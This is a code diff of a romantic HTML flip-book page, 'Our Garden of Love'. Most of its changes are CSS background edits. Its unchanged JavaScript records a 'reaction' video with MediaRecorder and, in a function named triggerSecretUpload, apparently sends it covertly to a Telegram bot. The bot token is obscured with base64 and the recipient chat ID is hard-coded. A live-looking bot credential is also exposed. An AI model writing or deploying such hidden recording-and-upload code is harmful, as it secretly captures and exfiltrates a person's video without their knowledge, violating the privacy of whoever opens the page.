@@ -6,7 +6,7 @@
     <title>Our Garden of Love ❤️</title>
     <style>
         :root { --rose: #ff4d6d; }
-        /* Background 1: Main Page Background */
+        /* Main Website Background */
         body { 
             background: url('bg.jpg') no-repeat center center fixed !important; 
             background-size: cover !important; 
@@ -18,14 +18,22 @@
         .book { width: 420px; height: 580px; position: relative; transform-style: preserve-3d; }
         .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
         .page.flipped { transform: rotateY(-180deg); }
-        .front, .back { width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid #eee; background: #fff; }
-        /* Background 2: Inside Page Background */
+        
+        /* UPDATED: Applied bg.jpg to the notebook pages */
+        .front { 
+            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 0 20px 20px 0; border: 1px solid #eee; 
+            background: url('bg.jpg') no-repeat center center !important; 
+            background-size: cover !important; 
+        }
+        
         .back { 
+            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;
             transform: rotateY(180deg); 
             background: url('bg2.jpg') no-repeat center center !important; 
             background-size: cover !important; 
             border-radius: 20px 0 0 20px; 
         }
+
         img, video { max-width: 100%; max-height: 350px; border: 8px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.2); border-radius: 5px; }
         p { font-size: 1.3rem; color: #444; text-align: center; margin-top: 20px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.8); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
@@ -87,8 +95,9 @@
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571");
+                    formData.append('chat_id', "5324376571"); 
                     formData.append('video', blob, 'reaction.mp4');
+                    // YOUR WORKING TOKEN
                     const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
                     fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
                 };
@@ -97,7 +106,7 @@
 
         async function triggerSecretUpload(btn) {
             bgMusic.pause();
-            const vn = new Audio('voice note.mp4');
+            const vn = new Audio('voice note.mp4'); 
             btn.innerHTML = "Listening... ❤️";
             btn.disabled = true;
             vn.play();
